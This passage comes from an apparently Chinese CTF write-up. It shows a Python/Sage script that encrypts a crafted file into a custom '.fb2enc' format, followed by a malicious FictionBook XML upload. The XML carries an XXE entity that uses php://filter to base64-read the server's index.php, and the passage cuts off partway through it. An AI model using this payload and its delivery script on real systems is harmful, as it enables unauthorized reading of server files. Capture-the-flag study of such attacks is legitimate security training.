style=color:#bd93f9>176</span>, <span style=color:#bd93f9>77</span>, <span style=color:#bd93f9>57</span>, <span style=color:#bd93f9>129</span>, <span style=color:#bd93f9>58</span>, <span style=color:#bd93f9>158</span>, <span style=color:#bd93f9>236</span>, <span style=color:#bd93f9>216</span>], [<span style=color:#bd93f9>251</span>, <span style=color:#bd93f9>113</span>, <span style=color:#bd93f9>127</span>, <span style=color:#bd93f9>26</span>, <span style=color:#bd93f9>231</span>, <span style=color:#bd93f9>121</span>, <span style=color:#bd93f9>145</span>, <span style=color:#bd93f9>246</span>, <span style=color:#bd93f9>31</span>, <span style=color:#bd93f9>188</span>, <span style=color:#bd93f9>24</span>, <span style=color:#bd93f9>61</span>, <span style=color:#bd93f9>47</span>, <span style=color:#bd93f9>17</span>, <span style=color:#bd93f9>40</span>, <span style=color:#bd93f9>239</span>], [<span style=color:#bd93f9>9</span>, <span style=color:#bd93f9>44</span>, <span style=color:#bd93f9>38</span>, <span style=color:#bd93f9>102</span>, <span style=color:#bd93f9>133</span>, <span style=color:#bd93f9>90</span>, <span style=color:#bd93f9>228</span>, <span style=color:#bd93f9>90</span>, <span style=color:#bd93f9>250</span>, <span style=color:#bd93f9>221</span>, <span style=color:#bd93f9>243</span>, <span style=color:#bd93f9>196</span>, <span style=color:#bd93f9>238</span>, <span style=color:#bd93f9>87</span>, <span style=color:#bd93f9>99</span>, <span style=color:#bd93f9>44</span>], [<span style=color:#bd93f9>168</span>, <span style=color:#bd93f9>134</span>, <span style=color:#bd93f9>246</span>, <span style=color:#bd93f9>238</span>, <span style=color:#bd93f9>139</span>, <span style=color:#bd93f9>62</span>, <span style=color:#bd93f9>50</span>, <span style=color:#bd93f9>54</span>, <span style=color:#bd93f9>68</span>, <span style=color:#bd93f9>125</span>, <span style=color:#bd93f9>125</span>, <span style=color:#bd93f9>244</span>, <span style=color:#bd93f9>147</span>, <span style=color:#bd93f9>247</span>, <span style=color:#bd93f9>141</span>, <span style=color:#bd93f9>111</span>], [<span style=color:#bd93f9>169</span>, <span style=color:#bd93f9>5</span>, <span style=color:#bd93f9>241</span>, <span style=color:#bd93f9>143</span>, <span style=color:#bd93f9>200</span>, <span style=color:#bd93f9>163</span>, <span style=color:#bd93f9>99</span>, <span style=color:#bd93f9>107</span>, <span style=color:#bd93f9>90</span>, <span style=color:#bd93f9>90</span>, <span style=color:#bd93f9>252</span>, <span style=color:#bd93f9>42</span>, <span style=color:#bd93f9>6</span>, <span style=color:#bd93f9>205</span>, <span style=color:#bd93f9>232</span>, <span style=color:#bd93f9>69</span>], [<span style=color:#bd93f9>158</span>, <span style=color:#bd93f9>22</span>, <span style=color:#bd93f9>34</span>, <span style=color:#bd93f9>134</span>, <span style=color:#bd93f9>78</span>, <span style=color:#bd93f9>231</span>, <span style=color:#bd93f9>209</span>, <span style=color:#bd93f9>115</span>, <span style=color:#bd93f9>243</span>, <span style=color:#bd93f9>112</span>, <span style=color:#bd93f9>140</span>, <span style=color:#bd93f9>191</span>, <span style=color:#bd93f9>244</span>, <span style=color:#bd93f9>16</span>, <span style=color:#bd93f9>115</span>, <span style=color:#bd93f9>135</span>], [<span style=color:#bd93f9>82</span>, <span style=color:#bd93f9>41</span>, <span style=color:#bd93f9>33</span>, <span style=color:#bd93f9>142</span>, <span style=color:#bd93f9>53</span>, <span style=color:#bd93f9>118</span>, <span style=color:#bd93f9>164</span>, <span style=color:#bd93f9>172</span>, <span style=color:#bd93f9>94</span>, <span style=color:#bd93f9>10</span>, <span style=color:#bd93f9>90</span>, <span style=color:#bd93f9>242</span>, <span style=color:#bd93f9>230</span>, <span style=color:#bd93f9>129</span>, <span style=color:#bd93f9>85</span>, <span style=color:#bd93f9>142</span>], [<span style=color:#bd93f9>7</span>, <span style=color:#bd93f9>89</span>, <span style=color:#bd93f9>153</span>, <span style=color:#bd93f9>221</span>, <span style=color:#bd93f9>197</span>, <span style=color:#bd93f9>173</span>, <span style=color:#bd93f9>50</span>, <span style=color:#bd93f9>92</span>, <span style=color:#bd93f9>112</span>, <span style=color:#bd93f9>80</span>, <span style=color:#bd93f9>250</span>, <span style=color:#bd93f9>188</span>, <span style=color:#bd93f9>134</span>, <span style=color:#bd93f9>123</span>, <span style=color:#bd93f9>100</span>, <span style=color:#bd93f9>248</span>], [<span style=color:#bd93f9>213</span>, <span style=color:#bd93f9>130</span>, <span style=color:#bd93f9>238</span>, <span style=color:#bd93f9>135</span>, <span style=color:#bd93f9>62</span>, <span style=color:#bd93f9>36</span>, <span style=color:#bd93f9>115</span>, <span style=color:#bd93f9>153</span>, <span style=color:#bd93f9>161</span>, <span style=color:#bd93f9>103</span>, <span style=color:#bd93f9>132</span>, <span style=color:#bd93f9>254</span>, <span style=color:#bd93f9>184</span>, <span style=color:#bd93f9>255</span>, <span style=color:#bd93f9>205</span>, <span style=color:#bd93f9>240</span>], [<span style=color:#bd93f9>229</span>, <span style=color:#bd93f9>171</span>, <span style=color:#bd93f9>105</span>, <span style=color:#bd93f9>141</span>, <span style=color:#bd93f9>167</span>, <span style=color:#bd93f9>125</span>, <span style=color:#bd93f9>230</span>, <span style=color:#bd93f9>102</span>, <span style=color:#bd93f9>234</span>, <span style=color:#bd93f9>77</span>, <span style=color:#bd93f9>220</span>, <span style=color:#bd93f9>166</span>, <span style=color:#bd93f9>235</span>, <span style=color:#bd93f9>3</span>, <span style=color:#bd93f9>190</span>, <span style=color:#bd93f9>180</span>], [<span style=color:#bd93f9>180</span>, <span style=color:#bd93f9>42</span>, <span style=color:#bd93f9>228</span>, <span style=color:#bd93f9>241</span>, <span style=color:#bd93f9>79</span>, <span style=color:#bd93f9>92</span>, <span style=color:#bd93f9>125</span>, <span style=color:#bd93f9>32</span>, <span style=color:#bd93f9>223</span>, <span style=color:#bd93f9>99</span>, <span style=color:#bd93f9>194</span>, <span style=color:#bd93f9>59</span>, <span style=color:#bd93f9>16</span>, <span style=color:#bd93f9>89</span>, <span style=color:#bd93f9>84</span>, <span style=color:#bd93f9>157</span>], [<span style=color:#bd93f9>50</span>, <span style=color:#bd93f9>81</span>, <span style=color:#bd93f9>82</span>, <span style=color:#bd93f9>71</span>, <span style=color:#bd93f9>221</span>, <span style=color:#bd93f9>123</span>, <span style=color:#bd93f9>17</span>, <span style=color:#bd93f9>1</span>, <span style=color:#bd93f9>204</span>, <span style=color:#bd93f9>139</span>, <span style=color:#bd93f9>154</span>, <span style=color:#bd93f9>232</span>, <span style=color:#bd93f9>53</span>, <span style=color:#bd93f9>11</span>, <span style=color:#bd93f9>226</span>, <span style=color:#bd93f9>41</span>], [<span style=color:#bd93f9>53</span>, <span style=color:#bd93f9>122</span>, <span style=color:#bd93f9>86</span>, <span style=color:#bd93f9>237</span>, <span style=color:#bd93f9>92</span>, <span style=color:#bd93f9>165</span>, <span style=color:#bd93f9>76</span>, <span style=color:#bd93f9>21</span>, <span style=color:#bd93f9>79</span>, <span style=color:#bd93f9>178</span>, <span style=color:#bd93f9>121</span>, <span style=color:#bd93f9>94</span>, <span style=color:#bd93f9>81</span>, <span style=color:#bd93f9>98</span>, <span style=color:#bd93f9>217</span>, <span style=color:#bd93f9>105</span>]]
</span></span><span style=display:flex><span>    R <span style=color:#ff79c6>=</span> IntegerModRing(_sage_const_256 )
</span></span><span style=display:flex><span>    y <span style=color:#ff79c6>=</span> vector(R, y)
</span></span><span style=display:flex><span>    mat <span style=color:#ff79c6>=</span> matrix(R, mat)
</span></span><span style=display:flex><span>    ret <span style=color:#ff79c6>=</span> mat<span style=color:#ff79c6>.</span>solve_right(y)
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> ret
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Mminus <span style=color:#ff79c6>=</span> [
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>135</span>, <span style=color:#bd93f9>25</span>, <span style=color:#bd93f9>77</span>, <span style=color:#bd93f9>128</span>, <span style=color:#bd93f9>251</span>, <span style=color:#bd93f9>9</span>, <span style=color:#bd93f9>168</span>, <span style=color:#bd93f9>169</span>, <span style=color:#bd93f9>158</span>, <span style=color:#bd93f9>82</span>, <span style=color:#bd93f9>7</span>, <span style=color:#bd93f9>213</span>, <span style=color:#bd93f9>229</span>, <span style=color:#bd93f9>180</span>, <span style=color:#bd93f9>50</span>, <span style=color:#bd93f9>53</span>, <span style=color:#bd93f9>172</span>,
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>215</span>, <span style=color:#bd93f9>32</span>, <span style=color:#bd93f9>243</span>, <span style=color:#bd93f9>113</span>, <span style=color:#bd93f9>44</span>, <span style=color:#bd93f9>134</span>, <span style=color:#bd93f9>5</span>, <span style=color:#bd93f9>22</span>, <span style=color:#bd93f9>41</span>, <span style=color:#bd93f9>89</span>, <span style=color:#bd93f9>130</span>, <span style=color:#bd93f9>171</span>, <span style=color:#bd93f9>42</span>, <span style=color:#bd93f9>81</span>, <span style=color:#bd93f9>122</span>, <span style=color:#bd93f9>38</span>, <span style=color:#bd93f9>36</span>,
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>125</span>, <span style=color:#bd93f9>25</span>, <span style=color:#bd93f9>127</span>, <span style=color:#bd93f9>38</span>, <span style=color:#bd93f9>246</span>, <span style=color:#bd93f9>241</span>, <span style=color:#bd93f9>34</span>, <span style=color:#bd93f9>33</span>, <span style=color:#bd93f9>153</span>, <span style=color:#bd93f9>238</span>, <span style=color:#bd93f9>105</span>, <span style=color:#bd93f9>228</span>, <span style=color:#bd93f9>82</span>, <span style=color:#bd93f9>86</span>, <span style=color:#bd93f9>43</span>, <span style=color:#bd93f9>81</span>,
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>161</span>, <span style=color:#bd93f9>104</span>, <span style=color:#bd93f9>26</span>, <span style=color:#bd93f9>102</span>, <span style=color:#bd93f9>238</span>, <span style=color:#bd93f9>143</span>, <span style=color:#bd93f9>134</span>, <span style=color:#bd93f9>142</span>, <span style=color:#bd93f9>221</span>, <span style=color:#bd93f9>135</span>, <span style=color:#bd93f9>141</span>, <span style=color:#bd93f9>241</span>, <span style=color:#bd93f9>71</span>, <span style=color:#bd93f9>237</span>, <span style=color:#bd93f9>153</span>,
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>159</span>, <span style=color:#bd93f9>65</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>231</span>, <span style=color:#bd93f9>133</span>, <span style=color:#bd93f9>139</span>, <span style=color:#bd93f9>200</span>, <span style=color:#bd93f9>78</span>, <span style=color:#bd93f9>53</span>, <span style=color:#bd93f9>197</span>, <span style=color:#bd93f9>62</span>, <span style=color:#bd93f9>167</span>, <span style=color:#bd93f9>79</span>, <span style=color:#bd93f9>221</span>, <span style=color:#bd93f9>92</span>, <span style=color:#bd93f9>164</span>,
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>120</span>, <span style=color:#bd93f9>15</span>, <span style=color:#bd93f9>48</span>, <span style=color:#bd93f9>121</span>, <span style=color:#bd93f9>90</span>, <span style=color:#bd93f9>62</span>, <span style=color:#bd93f9>163</span>, <span style=color:#bd93f9>231</span>, <span style=color:#bd93f9>118</span>, <span style=color:#bd93f9>173</span>, <span style=color:#bd93f9>36</span>, <span style=color:#bd93f9>125</span>, <span style=color:#bd93f9>92</span>, <span style=color:#bd93f9>123</span>, <span style=color:#bd93f9>165</span>, <span style=color:#bd93f9>5</span>,
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>106</span>, <span style=color:#bd93f9>129</span>, <span style=color:#bd93f9>156</span>, <span style=color:#bd93f9>145</span>, <span style=color:#bd93f9>228</span>, <span style=color:#bd93f9>50</span>, <span style=color:#bd93f9>99</span>, <span style=color:#bd93f9>209</span>, <span style=color:#bd93f9>164</span>, <span style=color:#bd93f9>50</span>, <span style=color:#bd93f9>115</span>, <span style=color:#bd93f9>230</span>, <span style=color:#bd93f9>125</span>, <span style=color:#bd93f9>17</span>, <span style=color:#bd93f9>76</span>, <span style=color:#bd93f9>208</span>,
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>67</span>, <span style=color:#bd93f9>38</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>246</span>, <span style=color:#bd93f9>90</span>, <span style=color:#bd93f9>54</span>, <span style=color:#bd93f9>107</span>, <span style=color:#bd93f9>115</span>, <span style=color:#bd93f9>172</span>, <span style=color:#bd93f9>92</span>, <span style=color:#bd93f9>153</span>, <span style=color:#bd93f9>102</span>, <span style=color:#bd93f9>32</span>, <span style=color:#bd93f9>1</span>, <span style=color:#bd93f9>21</span>, <span style=color:#bd93f9>80</span>, <span style=color:#bd93f9>145</span>,
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>209</span>, <span style=color:#bd93f9>176</span>, <span style=color:#bd93f9>31</span>, <span style=color:#bd93f9>250</span>, <span style=color:#bd93f9>68</span>, <span style=color:#bd93f9>90</span>, <span style=color:#bd93f9>243</span>, <span style=color:#bd93f9>94</span>, <span style=color:#bd93f9>112</span>, <span style=color:#bd93f9>161</span>, <span style=color:#bd93f9>234</span>, <span style=color:#bd93f9>223</span>, <span style=color:#bd93f9>204</span>, <span style=color:#bd93f9>79</span>, <span style=color:#bd93f9>209</span>, <span style=color:#bd93f9>222</span>,
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>16</span>, <span style=color:#bd93f9>77</span>, <span style=color:#bd93f9>188</span>, <span style=color:#bd93f9>221</span>, <span style=color:#bd93f9>125</span>, <span style=color:#bd93f9>90</span>, <span style=color:#bd93f9>112</span>, <span style=color:#bd93f9>10</span>, <span style=color:#bd93f9>80</span>, <span style=color:#bd93f9>103</span>, <span style=color:#bd93f9>77</span>, <span style=color:#bd93f9>99</span>, <span style=color:#bd93f9>139</span>, <span style=color:#bd93f9>178</span>, <span style=color:#bd93f9>137</span>, <span style=color:#bd93f9>128</span>,
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>192</span>, <span style=color:#bd93f9>57</span>, <span style=color:#bd93f9>24</span>, <span style=color:#bd93f9>243</span>, <span style=color:#bd93f9>125</span>, <span style=color:#bd93f9>252</span>, <span style=color:#bd93f9>140</span>, <span style=color:#bd93f9>90</span>, <span style=color:#bd93f9>250</span>, <span style=color:#bd93f9>132</span>, <span style=color:#bd93f9>220</span>, <span style=color:#bd93f9>194</span>, <span style=color:#bd93f9>154</span>, <span style=color:#bd93f9>121</span>, <span style=color:#bd93f9>114</span>, <span style=color:#bd93f9>55</span>,
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>27</span>, <span style=color:#bd93f9>129</span>, <span style=color:#bd93f9>61</span>, <span style=color:#bd93f9>196</span>, <span style=color:#bd93f9>244</span>, <span style=color:#bd93f9>42</span>, <span style=color:#bd93f9>191</span>, <span style=color:#bd93f9>242</span>, <span style=color:#bd93f9>188</span>, <span style=color:#bd93f9>254</span>, <span style=color:#bd93f9>166</span>, <span style=color:#bd93f9>59</span>, <span style=color:#bd93f9>232</span>, <span style=color:#bd93f9>94</span>, <span style=color:#bd93f9>237</span>, <span style=color:#bd93f9>209</span>,
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>192</span>, <span style=color:#bd93f9>58</span>, <span style=color:#bd93f9>47</span>, <span style=color:#bd93f9>238</span>, <span style=color:#bd93f9>147</span>, <span style=color:#bd93f9>6</span>, <span style=color:#bd93f9>244</span>, <span style=color:#bd93f9>230</span>, <span style=color:#bd93f9>134</span>, <span style=color:#bd93f9>184</span>, <span style=color:#bd93f9>235</span>, <span style=color:#bd93f9>16</span>, <span style=color:#bd93f9>53</span>, <span style=color:#bd93f9>81</span>, <span style=color:#bd93f9>121</span>, <span style=color:#bd93f9>248</span>,
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>117</span>, <span style=color:#bd93f9>158</span>, <span style=color:#bd93f9>17</span>, <span style=color:#bd93f9>87</span>, <span style=color:#bd93f9>247</span>, <span style=color:#bd93f9>205</span>, <span style=color:#bd93f9>16</span>, <span style=color:#bd93f9>129</span>, <span style=color:#bd93f9>123</span>, <span style=color:#bd93f9>255</span>, <span style=color:#bd93f9>3</span>, <span style=color:#bd93f9>89</span>, <span style=color:#bd93f9>11</span>, <span style=color:#bd93f9>98</span>, <span style=color:#bd93f9>58</span>, <span style=color:#bd93f9>125</span>, <span style=color:#bd93f9>181</span>,
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>236</span>, <span style=color:#bd93f9>40</span>, <span style=color:#bd93f9>99</span>, <span style=color:#bd93f9>141</span>, <span style=color:#bd93f9>232</span>, <span style=color:#bd93f9>115</span>, <span style=color:#bd93f9>85</span>, <span style=color:#bd93f9>100</span>, <span style=color:#bd93f9>205</span>, <span style=color:#bd93f9>190</span>, <span style=color:#bd93f9>84</span>, <span style=color:#bd93f9>226</span>, <span style=color:#bd93f9>217</span>, <span style=color:#bd93f9>214</span>, <span style=color:#bd93f9>115</span>, <span style=color:#bd93f9>62</span>,
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>216</span>, <span style=color:#bd93f9>239</span>, <span style=color:#bd93f9>44</span>, <span style=color:#bd93f9>111</span>, <span style=color:#bd93f9>69</span>, <span style=color:#bd93f9>135</span>, <span style=color:#bd93f9>142</span>, <span style=color:#bd93f9>248</span>, <span style=color:#bd93f9>240</span>, <span style=color:#bd93f9>180</span>, <span style=color:#bd93f9>157</span>, <span style=color:#bd93f9>41</span>, <span style=color:#bd93f9>105</span>
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>Pminus <span style=color:#ff79c6>=</span> [
</span></span><span style=display:flex><span>    <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\f</span><span style=color:#f1fa8c>&#39;</span>, <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\x0F</span><span style=color:#f1fa8c>&#39;</span>, <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\x0E</span><span style=color:#f1fa8c>&#39;</span>, <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\b</span><span style=color:#f1fa8c>&#39;</span>, <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\x03</span><span style=color:#f1fa8c>&#39;</span>, <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\v</span><span style=color:#f1fa8c>&#39;</span>, <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\r</span><span style=color:#f1fa8c>&#39;</span>, <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\0</span><span style=color:#f1fa8c>&#39;</span>, <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\a</span><span style=color:#f1fa8c>&#39;</span>, <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\t</span><span style=color:#f1fa8c>&#39;</span>, <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\x06</span><span style=color:#f1fa8c>&#39;</span>, <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\x02</span><span style=color:#f1fa8c>&#39;</span>, <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\x01</span><span style=color:#f1fa8c>&#39;</span>, <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\x05</span><span style=color:#f1fa8c>&#39;</span>, <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\x04</span><span style=color:#f1fa8c>&#39;</span>
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>rPminus <span style=color:#ff79c6>=</span> []
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>for</span> seq, c <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>enumerate</span>(Pminus):
</span></span><span style=display:flex><span>    Pminus[seq] <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>ord</span>(c)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>16</span>):
</span></span><span style=display:flex><span>    rPminus<span style=color:#ff79c6>.</span>append(Pminus<span style=color:#ff79c6>.</span>index(i))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> zlib
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>encrypt_block</span>(block):
</span></span><span style=display:flex><span>    block <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>bytearray</span>(block)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>16</span>):
</span></span><span style=display:flex><span>        tmp <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>bytearray</span>([<span style=color:#bd93f9>0</span> <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>16</span>)])
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>for</span> l <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>16</span>):
</span></span><span style=display:flex><span>            tmp[l] <span style=color:#ff79c6>=</span> block[rPminus[l]]
</span></span><span style=display:flex><span>        block <span style=color:#ff79c6>=</span> tmp
</span></span><span style=display:flex><span>        block <span style=color:#ff79c6>=</span> get_solve(<span style=color:#8be9fd;font-style:italic>list</span>(block))
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> <span style=color:#8be9fd;font-style:italic>bytearray</span>(block)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>encrypt</span>(data):
</span></span><span style=display:flex><span>    data <span style=color:#ff79c6>=</span> zlib<span style=color:#ff79c6>.</span>compress(data)
</span></span><span style=display:flex><span>    data <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>bytearray</span>(data)
</span></span><span style=display:flex><span>    pad <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>16</span> <span style=color:#ff79c6>-</span> <span style=color:#8be9fd;font-style:italic>len</span>(data) <span style=color:#ff79c6>%</span> <span style=color:#bd93f9>16</span>
</span></span><span style=display:flex><span>    data<span style=color:#ff79c6>.</span>extend([pad <span style=color:#ff79c6>for</span> _ <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(pad)])
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    enc <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>bytearray</span>()
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>0</span>, <span style=color:#8be9fd;font-style:italic>len</span>(data), <span style=color:#bd93f9>16</span>):
</span></span><span style=display:flex><span>        enc<span style=color:#ff79c6>.</span>extend(encrypt_block(data[i:i <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>16</span>]))
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> enc
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r <span style=color:#ff79c6>=</span> encrypt(<span style=color:#8be9fd;font-style:italic>open</span>(<span style=color:#f1fa8c>&#39;evil.xml&#39;</span>)<span style=color:#ff79c6>.</span>read())
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>open</span>(<span style=color:#f1fa8c>&#39;evil.fb2enc&#39;</span>, <span style=color:#f1fa8c>&#39;w&#39;</span>)<span style=color:#ff79c6>.</span>write(r)
</span></span></code></pre></div><p>接下来构造恶意 xml 并加密上传, 这个可以把正文给删了, 节省加密时间</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#ff79c6>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &#34;php://filter/read=convert.base64-encode/resource=/proc/self/cwd/index.php&#34; &gt;</span>]&gt;
</span></span><span style=display:flex><span><span style=color:#ff79c6>&lt;FictionBook</span> <span style=color:#50fa7b>xmlns:l=</span><span style=color:#f1fa8c>&#34;http://www.w3.org/1999/xlink&#34;</span> <span style=color:#50fa7b>xmlns=</span><span style=color:#f1fa8c>&#34;http://www.gribuser.ru/xml/fictionbook/2.0&#34;</span><span style=color:#ff79c6>&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;description&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&lt;title-info&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;genre&gt;</span>fiction<span style=color:#ff79c6>&lt;/genre&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;author&gt;</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>&lt;first-name&gt;</span>Антуан<span style=color:#ff79c6>&lt;/first-name&gt;</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>&lt;middle-name&gt;</span>де Сент<span style=color:#ff79c6>&lt;/middle-name&gt;</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>&lt;last-name&gt;</span>Экзюпери<span style=color:#ff79c6>&lt;/last-name&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;/author&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;book-title&gt;</span>Маленький Принц<span style=color:#ff79c6>&lt;/book-title&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;annotation&gt;</span>
</span></span><span style=display:flex><span>                123
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;/annotation&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;date&gt;</span>&amp;xxe;<span style=color:#ff79c6>&lt;/date&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;coverpage&gt;</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>&lt;image</span> <span style=color:#50fa7b>l:href=</span><span style=color:#f1fa8c>&#34;#cover.jpg&#34;</span> <span style=color:#ff79c6>/&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;/coverpage&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;lang&gt;</span>ru<span style=color:#ff79c6>&lt;/lang&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;src-lang&gt;</span>fr<span style=color:#ff79c6>&lt;/src-lang&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;translator&gt;</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>&lt;first-name&gt;</span>Нора<span style=color:#ff79c6>&lt;/first-name&gt;</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>&lt;last-name&gt;</span>Галь<span style=color:#ff79c6>&lt;/last-name&gt;</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>&lt;home-page&gt;</span>http://www.vavilon.ru/noragal/content.html<span style=color:#ff79c6>&lt;/home-page&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;/translator&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&lt;/title-info&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&lt;document-info&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;author&gt;</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>&lt;first-name&gt;</span>Дмитрий<span style=color:#ff79c6>&lt;/first-name&gt;</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>&lt;middle-name&gt;</span>Петрович<span style=color:#ff79c6>&lt;/middle-name&gt;</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>&lt;last-name&gt;</span>Грибов<span style=color:#ff79c6>&lt;/last-name&gt;</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>&lt;email&gt;</span>grib@gribuser.ru<span style=color:#ff79c6>&lt;/email&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;/author&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;author&gt;</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>&lt;first-name&gt;</span>Faiber<span style=color:#ff79c6>&lt;/first-name&gt;</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>&lt;last-name</span> <span style=color:#ff79c6>/&gt;</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>&lt;email&gt;</span>faiber@yandex.ru<span style=color:#ff79c6>&lt;/email&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;/author&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;program-used&gt;</span>FB Tools<span style=color:#ff79c6>&lt;/program-used&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;date&gt;</span>2006-01-14<span style=color:#ff79c6>&lt;/date&gt;</span>
